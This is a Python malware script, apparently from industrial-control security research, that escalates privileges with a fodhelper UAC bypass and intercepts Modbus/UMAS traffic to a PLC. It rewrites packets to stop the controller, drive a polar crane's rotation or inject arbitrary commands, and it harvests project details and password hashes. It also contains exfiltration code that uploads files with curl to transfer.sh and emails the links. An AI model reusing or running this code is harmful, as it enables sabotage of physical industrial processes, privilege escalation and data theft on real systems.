# Written by G. Renault - 20/04/2023
# Thanks to https://medium.com/@tommelo/bypassing-windows-10-uac-with-python-aed3c835c4f0

from hashlib import sha256
from base64 import b64decode
import pydivert
from pyuac import isUserAdmin
from traceback import format_exc
from logging import error
import os
from sys import exit
import ctypes
import winreg
from smtplib import SMTP
import subprocess
from time import sleep, time
from string import hexdigits

CMD = r"C:\\Windows\\System32\\cmd.exe"  # Path to windows terminal
# Path to fodhelper.exe for UAC by-pass
FOD_HELPER = r"C:\\Windows\\System32\\fodhelper.exe"
# For debugging and executing this python script: EXECUTION_CMD = "python"
EXECUTION_CMD = ""
# Path to reg key for UAC by-pass
REG_PATH = "Software\Classes\ms-settings\shell\open\command"
DELEGATE_EXEC_REG_KEY = "DelegateExecute"  # Registry key for UAC by-pass
DEFAULT_SPEED_B = b"\x25"  # Default speed set during attack B


class attack:
    """This class represents the attack and its associated state.
    The associated state can be one of the following:
    - payload_init_A: Initial Attack A (this will prevent the PLC to start by replacing start payload by a keep alive payload).
    - payload_A: Atack A (this will stop the PLC by replacing keep alive payload by stop PLC payload).
    - payload_B: Atack B (this will modify internal variables of the PLC and activate the physical process).
    - payload_C: Atack C (this will execute a given command).
    - reset: No attack (i.e. waiting for the next attack to start).
    """

    state = None
    command = b""


def main():
    def read_trigger():
        """This functions will read the trigger.txt file and update attack_ accordingly to the attack state.
        The trigger.txt file is updated by USB Ninja cable in function of the attack triggered.
        """
        global attack_, exfiltrate_data
        with open(
            os.path.expanduser("~") + "\\Desktop\\powershell_script\\trigger.txt", "a+"
        ) as f:
            f.seek(0)
            first_Line = f.readline()
            if first_Line in {"init_A", "init_A\n"}:
                attack_.state = "payload_init_A"
            elif first_Line in {"init", "init\n"}:
                attack_.state = "payload_init"
            elif first_Line in {"A", "A\n"}:
                attack_.state = "payload_A"
            elif first_Line in {"B", "B\n"}:
                attack_.command = DEFAULT_SPEED_B
                attack_.state = "payload_B"
            elif first_Line[0] == "B":
                tmp = -1 if first_Line[-1] == "\n" else None
                if first_Line[2:tmp].isdigit() and int(first_Line[2:tmp]) <= 0x255:
                    attack_.command = int(first_Line[2:tmp]).to_bytes(1)
                else:
                    attack_.command = DEFAULT_SPEED_B
                attack_.state = "payload_B"
            elif first_Line in {"reset", "reset\n"}:
                attack_.state = "payload_reset"
            elif first_Line in {"exfiltrate", "exfiltrate\n"}:
                exfiltrate_data = True
            elif first_Line[0] == "C":
                attack_.command = bytes(
                    first_Line[2:].encode().decode("unicode_escape"), "latin1"
                )
                attack_.state = "payload_C"

    def MITM_attack():
        """This function will perform the MITM attack."""
        global attack_, payload_lengths

        global project_name, ciphered_programm_pwd, verify_str_app_pwd, version, computer_name, file_path, password, pwd_encoded, client_nonce, server_nonce, hw_id, check_byte

        global read_next_packet_info, read_next_packet_HW_id, read_next_packet_check_byte, attack_B_step, start_time_rotation, duration_of_rotation, seq_ack_nbr_shift, table_var_init

        # Iterate over packets
        with pydivert.WinDivert(
            "(tcp.DstPort == 502 and ip.SrcAddr == 192.168.11.10) or (tcp.SrcPort == 502 and ip.SrcAddr == 192.168.11.110)"  # NOTE: Must be updated with the ip of the PLC/Workstation
        ) as w:
            for i, packet in enumerate(w):
                payload = packet.payload

                # Modify ACK/SEQ to match the modified communication protocol
                try:
                    if packet.tcp.ack and packet.tcp.rst:
                        seq_ack_nbr_shift = 0
                    if (
                        packet.ip.dst_addr == "192.168.11.110"
                    ):  # NOTE: Must be updated with the ip of the PLC
                        packet.tcp.seq_num += seq_ack_nbr_shift
                    if (
                        packet.ip.dst_addr == "192.168.11.10"
                    ):  # NOTE: Must be updated with the ip of the Engineering Workstation
                        packet.tcp.ack_num -= seq_ack_nbr_shift
                except:
                    pass

                # Keep only UMAS packet
                if len(payload) > 9 and payload[7] == 0x5A:
                    modbus_tcp = payload[0:7]
                    modbus = payload[7:]
                    fct_code = modbus[0]  # 0x5a
                    session = modbus[1]
                    umas_status = modbus[2]
                    data = modbus[3:]
                    try:
                        # READ_PLC_INFO leaks the session (i.e check_byte)
                        if umas_status == 0x04 and len(payload) == 10:
                            check_byte = "{0:#0{1}x}".format(session, 4)[2:]

                        if umas_status == 0x12:  # Keep alive
                            # If no attack in progress: read if an attack is triggered
                            if (
                                attack_.state == "payload_reset"
                                or attack_.state == "payload_init"
                                or attack_B_step == 8
                            ):
                                try:
                                    read_trigger()
                                    if (
                                        attack_.state == "payload_reset"
                                        and attack_B_step == 8
                                    ):
                                        attack_B_step = 0
                                        store_info("attack_B_step set to 0")
                                except BaseException as exception:
                                    store_info(
                                        "An exception occurred: {}".format(exception)
                                        + "\n"
                                        + exception.__doc__
                                        + format_exc()
                                    )

                            elif attack_.state == "payload_A":  # Attack A in progress
                                try:
                                    auth_hash_pre = sha256_digest(hw_id + client_nonce)
                                    auth_hash_post = sha256_digest(hw_id + server_nonce)
                                    to_send = (
                                        b"\x5a"
                                        + bytes.fromhex(check_byte)
                                        + b"\x41\xFF\x00"
                                    )  # Stops the PLC
                                    auth_hash_2 = sha256_digest(
                                        auth_hash_pre + to_send + auth_hash_post
                                    )
                                    stop_plc_pkt = (
                                        b"\x5a"
                                        + bytes.fromhex(check_byte)
                                        + b"\x38\01"
                                        + auth_hash_2
                                        + to_send
                                    )

                                    # Craft stops PLC packet
                                    # No auth
                                    packet.payload = (
                                        modbus_tcp[0:5] + b"\x06\x00" + to_send
                                    )
                                    seq_ack_nbr_shift += 2

                                    # Auth
                                    # packet.payload = modbus_tcp + stop_plc_pkt

                                    # Attack A is over
                                    store_info("Attack A was a success")
                                    w.send(packet)
                                    return 0
                                except BaseException as exception:
                                    store_info(
                                        "An exception occurred: {}".format(exception)
                                        + "\n"
                                        + exception.__doc__
                                        + format_exc()
                                    )

                        if umas_status == 0x20:
                            if (
                                payload[11] == 0x14
                                and payload[12] == 0x00
                                and payload[13] == 0x00
                                and payload[14] == 0x00
                            ):
                                read_next_packet_info = True

                        if umas_status == 0x40:
                            if attack_.state == "payload_init_A":
                                packet.payload = (
                                    modbus_tcp[0:5]
                                    + b"\x04\x00"
                                    + b"\x5a"
                                    + bytes.fromhex(check_byte)
                                    + b"\x12"
                                )
                                seq_ack_nbr_shift -= 2

                                # Init Attack A is over
                                store_info("Init Attack A was a success")
                                w.send(packet)
                                return 0

                        if umas_status == 0x2:
                            read_next_packet_HW_id = True

                        if umas_status == 0x6E:
                            client_nonce = payload[0x45 - 0x36 : 0x64 + 1 - 0x36].hex()

                        if umas_status == 0xFE:
                            if len(payload) > 11:
                                if payload[10] == 0xAA and payload[11] == 0xAA:
                                    server_nonce = payload[
                                        0x42 - 0x36 : 0x61 + 1 - 0x36
                                    ].hex()

                            if read_next_packet_info:
                                read_next_packet_info = False

                                # TODO: Uncomment the right paragraph and adapt if needed.
                                (
                                    project_name,
                                    version,
                                    computer_name,
                                    file_path,
                                    salt1,
                                    hash1,
                                    salt2,
                                    hash2,
                                ) = parse_project_info(payload[7:])
                                # OR
                                # project_name, pwd_encoded, version, computer_name, file_path, salt1, hash1, salt2, hash2 = parse_project_info(payload[7:])
                                # OR
                                # project_name, salt3, hash3, version, computer_name, file_path, salt1, hash1, salt2, hash2 = parse_project_info(payload[7:])
                                # OR
                                # project_name, pwd_encoded, salt3, hash3, version, computer_name, file_path, salt1, hash1, salt2, hash2 = parse_project_info(payload[7:])

                                tmp_log = f"Project name: {project_name}\nVersion of Unity Pro is: {version}\nComputer name is: {computer_name}\nPath to project file is: {file_path}\nsalt1={salt1}\nhash1={hash1}\nsalt2={salt2}\nhash2={hash2}"
                                store_info(tmp_log, "extracted_info.txt")

                            if read_next_packet_HW_id:
                                read_next_packet_HW_id = False
                                hw_id = payload[0x4E - 0x36 : 0x51 + 1 - 0x36].hex()

                            if read_next_packet_check_byte:
                                read_next_packet_check_byte = False
                                check_byte = payload[
                                    0x40 - 0x36 : 0x40 + 1 - 0x36
                                ].hex()

                        if (
                            payload[9] == 0x10
                            and payload[12] == 0x00
                            and payload[13] == 0x00
                        ):
                            auth_hash = str(payload[0x55 - 0x36 : 0x94 + 1 - 0x36])[
                                2:-1
                            ]
                            read_next_packet_check_byte = True

                        # Detect if table variables have been initialized
                        if (
                            int.from_bytes(payload[9:13], "big") == 0x50150002
                            and len(payload) == 20
                        ):
                            table_var_init = True

                        # Attack B in progress
                        if (
                            attack_.state == "payload_B"
                            and abs(time() - start_time_rotation) > duration_of_rotation
                            and attack_B_step <= 7
                        ):
                            if (
                                int.from_bytes(payload[9:13], "big") == 0x50150002
                                and len(payload) == 20
                                and table_var_init
                            ) or (
                                umas_status == 0x58
                                and len(payload) == 19
                                and not table_var_init
                            ):
                                start_time_rotation = time()
                                if attack_B_step == 0:  # Start initialize variables
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}\nTable var. has been init. ? {table_var_init}"
                                    )
                                    payload_lengths = [
                                        elem - len(payload) for elem in payload_lengths
                                    ]
                                    if not table_var_init:
                                        packet.payload = (
                                            payload[0:5]
                                            + b"\x46"
                                            + payload[6:8]
                                            + bytes.fromhex(check_byte)
                                            + b"\x50\x15\x00\x03\x01\x03\xdc\x00\x40\x00\x03\x03\x00\x00\x37\x00\x15\x01\x00\x2e\x00\xd8\x00\x00\x00\x37\x00\x0d\x01\x2e\x00\xdc\x00\x00\x00\x38\x00\x15\x01\x00\x2e\x00\xf5\x00\x00\x00\x39\x00\x15\x04\x00\x2e\x00\x66\x00\x00\x00\x3a\x00\x15\x02\x00\x2e\x00\x6c\x00\x00\x00\x3e\x00\x01\x05\x01\x04\x00\x00\x00\x03"
                                        )  # This is an exemple of packet to start the init. variable table
                                        seq_ack_nbr_shift += payload_lengths[
                                            attack_B_step
                                        ]

                                elif attack_B_step == 1:  # Set rotation speed
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x28"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0e\x00\x03\x04\x00\x00\x0e\x00\x14\x02\x00\x2e\x00\x68\x00\x00\x00\x0c\x00\x01"
                                        + attack_.command
                                        + b"\x00\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to change the rotation speed of the polar crane
                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                elif attack_B_step == 2:  # Activates process
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x26"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0c\x00\x03\x04\x00\x00\x0c\x00\x0c\x01\x2e\x00\xdc\x00\x00\x00\x0b\x00\x01\x01\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to change to activate the polar crane

                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                elif attack_B_step == 3:  # De-Activates process
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x26"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0c\x00\x03\x04\x00\x00\x0c\x00\x0c\x01\x2e\x00\xdc\x00\x00\x00\x0b\x00\x01\x00\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to change to activate the polar crane (falling edge)

                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                # Activates rotation (set to 1)
                                elif attack_B_step == 4:
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x27"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0d\x00\x03\x04\x00\x00\x0d\x00\x14\x01\x00\x2e\x00\xd8\x00\x00\x00\x0c\x00\x01\x01\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to rotates the polar crane (rising edge)

                                # Init back to 0 : Activates rotation (set to 0)
                                elif attack_B_step == 5:
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x27"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0d\x00\x03\x04\x00\x00\x0d\x00\x14\x01\x00\x2e\x00\xd8\x00\x00\x00\x0c\x00\x01\x00\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to rotates the polar crane (falling edge)

                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                # De-activates rotation (set to 1)
                                elif attack_B_step == 6:
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x27"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0d\x00\x03\x04\x00\x00\x0d\x00\x14\x01\x00\x2e\x00\xf5\x00\x00\x00\x0c\x00\x01\x01\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to stops the polar crane rotation (rising edge)

                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                # Init back to 0 : De-activates rotation (set to 0)
                                elif attack_B_step == 7:
                                    store_info(
                                        f"Packet {attack_B_step} : {packet.payload.hex()}"
                                    )
                                    packet.payload = (
                                        payload[0:5]
                                        + b"\x27"
                                        + payload[6:8]
                                        + bytes.fromhex(check_byte)
                                        + b"\x50\x15\x00\x03\x01\x04\x1c\x01\x0d\x00\x03\x04\x00\x00\x0d\x00\x14\x01\x00\x2e\x00\xf5\x00\x00\x00\x0c\x00\x01\x00\x05\x01\x04\x00\x00\x00\x04"
                                    )  # This is an exemple of packet to stops the polar crane rotation (falling edge)

                                    seq_ack_nbr_shift += payload_lengths[attack_B_step]
                                attack_B_step += 1
                                if attack_B_step == 8:
                                    # Attack B is over
                                    table_var_init = False
                                    payload_lengths = [87, 46, 44, 44, 45, 45, 45, 45]
                                    store_info("Attack B was a success")

                        elif attack_.state == "payload_C" and attack_.command != b"":
                            packet.payload = (
                                payload[0:5]
                                + b"\x27"
                                + payload[6:8]
                                + bytes.fromhex(check_byte)
                                + attack_.command
                            )
                            seq_ack_nbr_shift += len(attack_.command) + 9
                            store_info("Attack B bis was a success")
                            attack_.state == "payload_reset"

                    except BaseException as exception:
                        error(format_exc())
                        store_info(f"Error : {format_exc()}")

                w.send(packet)

    global attack_, payload_lengths, exfiltrate_data
    attack_ = attack()
    payload_lengths = [87, 46, 44, 44, 45, 45, 45, 45]
    exfiltrate_data = False

    global project_name, ciphered_programm_pwd, verify_str_app_pwd, version, computer_name, file_path, base64_1_decoded, client_nonce, server_nonce, hw_id, check_byte
    hw_id, client_nonce, server_nonce = "", "", ""

    global read_next_packet_info, read_next_packet_HW_id, read_next_packet_check_byte, attack_B_step, start_time_rotation, duration_of_rotation, seq_ack_nbr_shift, table_var_init

    attack_B_step = 0
    seq_ack_nbr_shift = 0
    table_var_init = False
    start_time_rotation = time()
    duration_of_rotation = 5  # #seconds between each packet sent

    while not exfiltrate_data:
        read_trigger()

        read_next_packet_info = False
        read_next_packet_HW_id = False
        read_next_packet_check_byte = False

        if attack_.state != "payload_reset":
            try:
                MITM_attack()
                while attack_.state != "payload_reset":  # Wait for reset
                    read_trigger()
                    sleep(1)
                seq_ack_nbr_shift = 0
            except BaseException as exception:
                store_info(
                    "An exception occurred: {}".format(exception)
                    + "\n"
                    + str(exception.__doc__)
                    + str(format_exc())
                )
        else:
            store_info("Waiting for attack type")
            sleep(1)

    # NOTE: Remove comments to upload program and project info
    # try:
    #     exfiltrate_data = False
    #     with open(os.path.expanduser('~') + '\\Desktop\\powershell_script\\debug_log.txt', 'w') as f:
    #         try:
    #             f.write(
    #                 f"Project name: {project_name}\nVersion of Unity Pro is: {version}\nComputer name is: {computer_name}\nPath to project file is: {file_path}")
    #         except:
    #             f.write(
    #                 f"Failed to get project info")
    #     url_list = []
    #     url_list += [upload_file(os.path.expanduser(
    #         '~') + '\\Desktop\\powershell_script\\debug_log.txt', "debug_log.txt")]
    #     path_tmp = '\"' + \
    #         file_path[1:-
    #                   1].replace("\\\\", "\\") + '\"'
    #     try:
    #         url_list += [upload_file(
    #             path_tmp, "program.stu")]
    #     except:
    #         url_list += ["File path not found"]

    #     # NOTE: Remove comment to send email
    #     # exfiltrate_data_fct(url_list)

    # except BaseException as exception:
    #     with open(os.path.expanduser('~') + '\\Desktop\\powershell_script\\debug_log.txt', 'w') as f:
    #         f.write('An exception occurred: {}'.format(
    #             exception) + "\n" + exception.__doc__ + format_exc())


def sha256_digest(input: str, base64_hash_b: bool = False) -> str:
    """Returns the SHA256 digest (encoded in base64 if base64_hash_b is True) of the given input

    Args:
        input (str): Input given to the hash function

    Returns:
        str: SHA256(input)
    """

    def is_hex_str(s):
        return set(s).issubset(hexdigits)

    m = sha256()
    if type(input) == bytes:
        m.update(input)
    elif is_hex_str(input):  # Raw hex
        m.update(bytes.fromhex(input))

    if base64_hash_b:
        return base64.b64encode(m.digest()).decode()
    return m.digest()


def parse_project_info(bytes_: bytes):
    """Parse the project informations

    Args:
        bytes_ (bytes): Bytes sequence to extract info from

    Returns:
        (str array): Project info
    """
    bytes_ = bytes_[0xD9:]
    extracted_info = []
    extract_bytes = b""
    for index in range(len(bytes_)):
        if bytes_[index].to_bytes() != b"\x00":
            extract_bytes += bytes_[index].to_bytes()
            if (index + 1 < len(bytes_)) and bytes_[index + 1].to_bytes() == b"\x00":
                extracted_info += [extract_bytes]
                extract_bytes = b""

    # NOTE: The following depends on the length of the project name and the number of password set by user
    # NOTE: Uncomment the right paragraph and modify if needed.
    # # - If app_pwd + prgrm_pwd (+ data_pwd + firmware_pwd) set
    # if len(extracted_info) == 8:
    #     extracted_info = extracted_info[0:2] + extracted_info[2].split(
    #         b'\x0d\x0a')[:-1] + extracted_info[3:6] + extracted_info[-2].split(
    #         b'\x0d\x0a')[:-1] + extracted_info[-1].split(b'\x0d\x0a')[:-1]
    #
    # if len(extracted_info) == 7:
    #     # If app_pwd (+ data_pwd + firmware_pwd) set
    #     if extracted_info[1] == 60:
    #         extracted_info = extracted_info[0] + extracted_info[1].split(
    #             b'\x0d\x0a')[:-1] + extracted_info[2:5] + extracted_info[-2].split(
    #             b'\x0d\x0a')[:-1] + extracted_info[-1].split(b'\x0d\x0a')[:-1]
    #     # If prgrm_pwd (+ data_pwd + firmware_pwd) set
    #     else:
    #         extracted_info = extracted_info[0:5] + extracted_info[-2].split(
    #             b'\x0d\x0a')[:-1] + extracted_info[-1].split(b'\x0d\x0a')[:-1]
    #
    # # - If (data_pwd + firmware_pwd) set
    if len(extracted_info) == 6:
        extracted_info = (
            extracted_info[:-2]
            + extracted_info[-2].split(b"\x0d\x0a")[:-1]
            + extracted_info[-1].split(b"\x0d\x0a")[:-1]
        )

    return [elem.decode() for elem in extracted_info]


def is_running_as_admin() -> bool:
    """Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise

    Returns:
        bool: Is file running with administrative privileges ?
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key: str, value: str):
    """Creates a register key

    Args:
        key(str): Register key to modify
        value(str): Register value to set
    """
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE
        )
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd: str):
    """Tries to bypass the UAC

    Args:
        cmd(str): Command string to execute in a terminal
    """
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, "")
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def execute_as_admin():
    """Tries to execute this script/file as admin without asking for the UAC."""
    if not is_running_as_admin():
        store_info("Script is not running as admin")
        try:
            # TODO: Choose if the malware needs internet and downloads the malware or if malware is already in the pc (~\Desktop\\Malware\\malwar3.exe)
            current_dir = (
                os.path.expanduser("~") + "\\Desktop\\Malware\\malwar3.exe"
            )  # No internet
            # current_dir = os.path.expanduser(
            #    '~') + '\\Desktop\\powershell_script\\malwar3.exe'  # Internet
            # cmd = '{} /c {} {}'.format(CMD, EXECUTION_CMD, current_dir) # Command to run this file/script
            cmd = f'{CMD} /c start /min "" {current_dir}'
            store_info(f"MITM in progress ({cmd})")
            bypass_uac(cmd)
            DETACHED_PROCESS = 0x00000008
            subprocess.call(
                f'{CMD} /c start /min "" C:\\Windows\\System32\\fodhelper.exe',
                creationflags=DETACHED_PROCESS,
            )  # os.system(FOD_HELPER)
            exit(0)
        except WindowsError:
            exit(1)
    else:
        store_info(
            "MITM in progress - Script is running with administrative privileges"
        )
        if isUserAdmin():
            # MITM attack
            main()
            # To revert registery modification
            bypass_uac("")


def exfiltrate_data_fct(url: list[str]):
    """Exfiltrates the data by sending an email containing the given URL list

    Args:
        url(list[str]): List of the urls
    """
    sender = "Engineering Station <engineering.station@edf.fr>"
    receiver = "Adversary <hacker@edf.fr>"

    if url is None or len(url) != 2:
        url = ["", ""]

    # DO NOT REMOVE THE TABULATORS (otherwise the program will not send the email, and this without failing)
    message = f"""\
Subject: Data exfiltration


To: {receiver}
From: {sender}

Please find the link for the data exfiltration: {url[0]}.
Please find the link for the program file: {url[1]}."""

    with SMTP("sandbox.smtp.mailtrap.io", 2525) as server:
        # WARNING, TODO: Fill-in with your smtp.mailtrap.io info (your username and your password)
        server.login("aaaaaaaaaaaaaa", "aaaaaaaaaaaaaa")
        server.sendmail(sender, receiver, message)
        store_info("Email sent")


def store_info(log: str, file: str = "debug_log.txt"):
    """Writes log into file

    Args:
        log (str): Message to wite in the file
        file (str, optional): File name. Defaults to "debug_log.txt".
    """
    with open(
        os.path.expanduser("~") + "\\Desktop\\powershell_script\\" + file, "w"
    ) as f:
        f.write(log)


def upload_file(path, file_name):
    """Uploads file and returns url to download it"""
    DETACHED_PROCESS = 0x00000008
    getLink = subprocess.Popen(
        f"curl --ssl-no-revoke --upload-file {path} https://transfer.sh/{file_name}",
        shell=True,
        stdout=subprocess.PIPE,
    ).stdout
    link = (getLink.read()).decode("utf-8")
    return link


if __name__ == "__main__":
    execute_as_admin()
